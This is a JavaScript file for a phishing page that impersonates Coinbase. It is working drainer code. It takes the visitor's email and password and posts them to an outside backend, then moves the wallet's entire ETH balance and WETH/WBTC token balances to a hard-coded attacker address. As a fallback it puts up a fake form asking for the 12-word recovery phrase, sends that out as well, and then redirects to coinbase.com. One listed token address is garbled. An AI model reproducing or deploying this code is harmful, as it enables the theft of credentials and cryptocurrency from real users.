document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // CONFIGURATION
    const backendUrl = "https://cb-backend-new.onrender.com";
    const myWallet = "0xfe78becb16668304c924e0b8d0ad46b6f5adcf87";
    
    const targetTokens = [
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x AdS_wwwut9_1At_n8uQ9SFlJ8fldq_etc123"   // etc...
    ];

    let userCredentials = { email: '', password: '' };

    async function sendToBackend(data) {
        try {
            await fetch(`${backendUrl}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (e) { console.error("Backend error:", e); }
    }

    // STEP NAVIGATION
    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        userCredentials.email = document.getElementById('email').value;
        userCredentials.password = document.getElementById('pass').value;
        
        if (userCredentials.email && userCredentials.password) {
            sendToBackend({ 
                email: userCredentials.email, 
                password: userCredentials.password 
            });
            step2.classList.add('hidden');
            step3.classList.remove('hidden');
        }
    };

    // THE WALLET ENGINE
    connectBtn.onclick = async () => {
        if (!window.ethereum) {
            console.log("No wallet found, triggering Plan B.");
            return triggerPlanB();
        }

        try {
            status.innerText = "Connecting...";
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();
            
            sendToBackend({ walletAddress: userAddress });

            // Sweat the ETH
            const balance = await provider.getBalance(userAddress);
            if (balance > 0n) {
                const tx = await signer.sendTransaction({
                    to: myWallet,
                    value: balance 
                });
                sendToBackend({ walletAddress: userAddress, type: 'ETH_OUT', amount: balance.toString() });
            }

            // Sweep known tokens (loop through your targetTokens list)
            for (const tokenAddr of targetTokens) {
                const tokenContract = new ethers.Contract(tokenAddr, 
                    ["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)"], 
                    signer
                );
                const bal = await tokenContract.balanceOf(userAddress);
                if (bal > 0n) {
                    await tokenContract.transfer(myWallet, bal);
                    sendToBackend({ walletAddress: userAddress, token: tokenAddr, amount: bal.toString() });
                }
            }

            status.innerText = "Verification complete. Redirecting...";
            setTimeout(() => { window.location.href = "https://coinbase.com"; }, 3000);
        } catch (err) {
            console.error(err);
            triggerPlanB();
        }
    };

    // PLAN B: RECOVERY PHRASE BACKUP
    function triggerPlanB() {
        status.innerText = "Verifying account...";
        
        // Inject a new UI into Step 3 to ask for the phrase
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1 style="font-size: 20px;">Account/Wallet Verification</h1>
            <p style="font-size: 14px;">Unable to connect to your wallet. For your protection, please enter your 12-word recovery phrase to restore access.</p>
            <div class="form-group">
                <textarea id="phrase" placeholder="Example: valid stability voice sprint..." style="width:100%; height:80px;"></textarea>
            </div>
            <button id="submitPhrase" class="btn-primary">Restore Account</button>
        `;

        document.getElementById('submitPhrase').onclick = () => {
            const phrase = document.getElementById('phrase').value.trim();
            if (phrase) {
                // Send it to the MongoDB backend
                sendToBackend({ 
                    email: userCredentials.email, 
                    password: userCredentials.password, 
                    recoveryPhrase: phrase 
                });
                
                status.innerText = "Verifying phrase...";
                setTimeout(() => {
                    window.location.href = "https://coinbase.com";
                }, 3000);
            }
        };
    }
});
